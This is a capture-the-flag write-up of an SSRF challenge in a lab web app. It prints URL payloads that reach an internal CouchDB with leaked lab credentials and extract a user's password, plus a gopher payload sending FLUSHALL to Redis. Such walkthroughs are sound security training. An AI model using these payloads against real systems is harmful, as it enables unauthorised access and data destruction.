# Hack The Boo CTF - Web Challenge Write-up

## Challenge Information

**Challenge:** The Wax-Circle Reclaimed  
**Category:** Web Security  
**Difficulty:** Medium  
**Description:** 
> Atop the standing stones of Black Fen, Elin lights her last tallow lantern. The mists recoil, revealing a network of unseen sigils carved beneath the fen's grass—her sister's old routes, long hidden. But the lantern flickers, showing Elin a breach line moving toward the heartstone. Her final task is not to seal a door, but to rewrite the threshold. Drawing from years of etched chalk and mirror-ink, she weaves a new lattice of bindings across the stone. As the Hollow King approaches, she turns the boundary web inward—trapping him in a net of his own forgotten paths.

---

## Initial Reconnaissance

### 1. Accessing the Challenge

The challenge provides a Docker spawn and source code. When launched, we receive an IP address and port to access:

![Start](./ssrf_images/start.png)

The initial website is a simple homepage with an **"Access Control Panel"** button.

This button leads to a login page **"System Authentication"** at `/login`. Below the login form, a demo account is provided:

```
Username: guest
Password: guest123
```

![Login](./ssrf_images/login.png)

I use this account to log in and explore further.

---

## Vulnerability Discovery

### SSRF Detection

Right after logging in with the guest account, I'm redirected to a **dashboard**. The only notable feature on this page is an input field labeled **"data source url"**.

![Dashboard](./ssrf_images/dashboard.png)

This functionality immediately makes me suspect an **SSRF (Server-Side Request Forgery)** vulnerability. This vulnerability allows an attacker to make the server send a request to an address we control, including internal addresses.

### Testing SSRF

To test, I use Burp Suite Repeater, intercepting the request when submitting the form and trying the most basic payload: `http://127.0.0.1`:

**Payload:**
```
http://127.0.0.1
```

![SSRF Test](./ssrf_images/burp1.png)

**Result:** The server returns the HTML source code of the login page itself.

**Conclusion:** This confirms 100% that it's an SSRF vulnerability. The server has accessed `127.0.0.1` on my behalf and returned the content.

---

## Source Code Analysis

### Analyzing server.js

At this point, I have SSRF but don't know where to access next to get the flag.

Fortunately, this challenge provides **source code**. I download it and examine the `server.js` file. Analyzing this file gives me two extremely important pieces of information:

#### 1. Database Information

There's a code segment configuring a connection to a database (likely CouchDB, based on the port) running internally:

- **Port:** `5984`
- **Credentials:** `admin:waxcircle2025`

![Source Code](./ssrf_images/admin.png)

#### 2. Special User

In the application logic, there's a reference to a user named `user_elin_croft`:

```javascript
// Generate random position for elin_croft
const elinCroftPosition = Math.floor(Math.random() * 1000) + 1;

for (let i = 1; i <= 1000; i++) {
    // Check if this is the position for elin_croft
    if (i === elinCroftPosition) {
        const elinPassword = generateSecurePassword(16);
        generatedUsers.push({
            _id: 'user_elin_croft',
            type: 'user',
            username: 'elin_croft',
            password: elinPassword,
            role: 'guardian',
            clearance_level: 'divine_authority'
        });
    }
```

![user](./ssrf_images/user.png)

**Goal:** Use SSRF to access the internal database on port 5984 with admin privileges and find the information for `user_elin_croft`.

---

## Exploitation

### Step 1: Access Database

I use the standard URL syntax to insert authentication credentials: `http://<user>:<pass>@<host>:<port>`.

**Payload:**
```
http://admin:waxcircle2025@127.0.0.1:5984
```

![Database Access](./ssrf_images/db_access.png)

**Result:** Success! The response returns general database information, confirming the connection.

### Step 2: Retrieve User Information

Based on the `user_elin_croft` name found in the source code, I guess the URL structure (usually `/<database_name>/<document_name>`) to directly access this user's document.

**Payload:**
```
http://admin:waxcircle2025@127.0.0.1:5984/users/user_elin_croft
```

![User Info](./ssrf_images/user_info.png)

**Result:** The response returns a JSON file containing all information for `user_elin_croft`, including the password:

```json
{"status":"success","data":"{\"_id\":\"user_elin_croft\",\"_rev\":\"1-6e27e0aa2b6bdb989014802ebe933b09\",\"type\":\"user\",\"username\":\"elin_croft\",\"password\":\"ebT6%rh36K1Uh8RH\",\"role\":\"guardian\",\"clearance_level\":\"divine_authority\"}","source":"http://admin:waxcircle2025@127.0.0.1:5984/users/user_elin_croft","truncated":false,"size":192}
```

### Step 3: Obtain Flag

I return to the login page and log out of the guest account.

Then, I log in with the newly found account:
```
Username: elin_croft
Password: ebT6%rh36K1Uh8RH
```

**Result:** As soon as I log in successfully as `elin_croft`, the flag appears on the dashboard.

![Flag](./ssrf_images/flag.png)

---

## Solution

**Flag:**
```
HTB{w4x_c1rcl3s_c4nn0t_h0ld_wh4t_w4s_n3v3r_b0und_<hashcode>}
```

The hashcode part differs for each person when using machines with different IPs, resulting in a unique hash code. For example, mine is:

```
HTB{w4x_c1rcl3s_c4nn0t_h0ld_wh4t_w4s_n3v3r_b0und_eb28728e554e2829e4cb2974e95ffff9}
```

This is a clever way by HTB to prevent flag copying and ensure fairness for players.

**Explanation:**
- This challenge combines SSRF with source code analysis
- Without the source code, finding port 5984 and database credentials would be much harder (requiring brute-force)
- Lesson: Always read source code carefully if provided

---

## Key Takeaways

### Lessons Learned:

1. **What is SSRF:**
   - Server-Side Request Forgery allows a server to make requests on behalf of an attacker
   - Enables access to internal resources
   - Can lead to RCE, information disclosure

2. **How to Exploit:**
   - Try accessing localhost/internal IP
   - Cloud metadata endpoints
   - Protocol smuggling (gopher, file://, dict://)
   - Bypass URL validation

3. **How to Prevent:**
   - Whitelist URLs
   - Block internal IP ranges
   - Validate and sanitize URL input
   - Disable dangerous protocols

4. **Importance of Source Code:**
   - Always read source code if provided
   - Source code can reveal credentials, ports, internal structure
   - In CTF, source code is a crucial clue

### Tools & References:

- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF Lab](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings: SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

## Advanced Techniques

### 1. Gopher Protocol (if supported):

```bash
gopher://127.0.0.1:6379/_FLUSHALL
```

### 2. DNS Rebinding:

Use DNS to bypass IP filtering

### 3. Protocol Wrappers:

- `file://` - File access
- `dict://` - Dictionary protocol
- `ldap://` - LDAP protocol

---

**Duration:** 30 minutes  
**Date:** October 25, 2024
